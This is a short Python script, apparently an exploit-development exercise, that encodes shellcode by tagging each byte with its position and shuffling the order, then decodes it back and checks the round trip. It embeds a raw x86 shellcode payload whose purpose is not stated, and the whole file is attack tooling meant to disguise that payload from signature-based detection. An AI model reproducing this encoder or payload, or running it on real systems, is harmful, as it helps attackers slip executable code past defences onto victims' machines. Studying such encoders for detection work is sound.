#!/usr/bin/env python3

import sys
import random

def encode(shellcode):
    """
    shellcode: string

    returns: string
    """
    shellcode_output = ""
    shell = [{count:i.replace("x","\\x")} for count, i in enumerate(shellcode.split("\\")[1:], start=1)]
    random.shuffle(shell)
    for p in shell:
        for key, value in p.items():
            shellcode_output += hex(key).replace("0x","\\x") + value
    return shellcode_output

def decode(encoded_shellcode):
    """decode()
    encoded_shellcode: string

    returns: string
    """
    ilist = [r"0{}".format(y) for y in encoded_shellcode.split("\\")[1:]]
    decoded = {}
    for count, code in enumerate(ilist):
        if count % 2 == 0:
            decoded[int(code, 0)] = ilist[count+1]
    return "".join([x[1].replace("0x","\\x") for x in sorted(decoded.items())])


def main():
    orginal_shellcode = r"\xbd\x6b\x98\x93\x2a\xd9\xe9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x12\x31\x6f\x12\x03\x6f\x12\x83\x84\x64\x71\xdf\x6b\x4e\x81\xc3\xd8\x33\x3d\x6e\xdc\x3a\x20\xde\x86\xf1\x23\x8c\x1f\xba\x1b\x7e\x1f\xf3\x1a\x79\x77\xc4\x75\x79\xb7\xac\x87\x7a\xb2\x15\x01\x9b\x0c\x03\x41\x0d\x3f\x7f\x62\x24\x5e\xb2\xe5\x64\xc8\x23\xc9\xfb\x60\xd4\x3a\xd3\x12\x4d\xcc\xc8\x80\xde\x47\xef\x94\xea\x9a\x70"
    new_shellcode = encode(orginal_shellcode)
    print("[+] Your encoded shellcode: ")
    print(new_shellcode.replace("\\x",",0x")[1:])
    print("\n[+] Decoded shellcode:")
    decoded_shellcode = decode(new_shellcode)
    assert decoded_shellcode == orginal_shellcode
    print(decoded_shellcode)


if __name__ == "__main__":
    main()

